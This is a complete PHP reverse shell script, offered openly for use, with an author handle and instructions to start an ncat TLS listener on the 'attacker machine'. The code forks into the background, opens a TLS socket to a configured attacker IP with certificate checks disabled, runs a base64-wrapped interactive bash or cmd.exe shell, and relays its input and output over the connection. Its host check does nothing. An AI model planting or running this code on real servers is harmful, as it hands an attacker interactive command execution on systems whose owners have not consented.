<?php
// WRITTEN AND MAINTAINED BY NZRXHX
// ON YOUR ATTACKER MACHINE USE: ncat -lvnp 443 --ssl
// YOU MIGHT WENT TO CONFIGURE PORT FORWARDING ON YOUR ROUTER OR VPN FOR PUBLIC IP USE
// CONFIGURATION
$allowed_hosts = ['192.168.1.1'];  // Your IP/domain only
$remote_host   = '192.168.1.1';      // Attacker's IP/domain
$remote_port   = 443;                  // TLS Port (can be changed to a personal port e.g:7777) 
$timeout       = 10;

// Verify allowed host
$client_ip = gethostbyname(gethostname());
if (!in_array($remote_host, $allowed_hosts)) {
    exit;
}

// Choose shell based on OS
$os = strtoupper(substr(PHP_OS, 0, 3));
$shell_cmd = ($os === 'WIN') ? 'cmd.exe' : '/bin/bash -i';

// Base64 encode wrapper shell command
$wrapped_shell = base64_encode($shell_cmd);

// Daemonize if possible
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid === -1) exit;
    if ($pid > 0) exit;
    posix_setsid();
}

// TLS over HTTP mimic
$opts = [
    'ssl' => [
        'verify_peer' => false,
        'verify_peer_name' => false,
    ]
];
$context = stream_context_create($opts);
$socket = stream_socket_client("ssl://$remote_host:$remote_port", $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $context);

if (!$socket) exit;

// Non-blocking streams
stream_set_blocking($socket, false);

// Open reverse shell
$descriptors = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"]
];

$process = proc_open("bash -c {echo,$wrapped_shell}|{base64,-d}|{bash,-i}", $descriptors, $pipes);
if (!is_resource($process)) {
    fclose($socket);
    exit;
}

// Stream setup
foreach ($pipes as $p) stream_set_blocking($p, false);

while (!feof($socket) && !feof($pipes[1])) {
    $read = [$socket, $pipes[1], $pipes[2]];
    $write = $except = null;

    if (stream_select($read, $write, $except, 0) === false) break;

    foreach ($read as $r) {
        if ($r === $socket) {
            $in = fread($socket, 2048);
            if ($in === false) break 2;
            fwrite($pipes[0], $in);
        } else {
            $out = fread($r, 2048);
            if ($out === false) break 2;
            fwrite($socket, $out);
        }
    }
}

// Cleanup
fclose($socket);
foreach ($pipes as $p) fclose($p);
proc_close($process);
?>
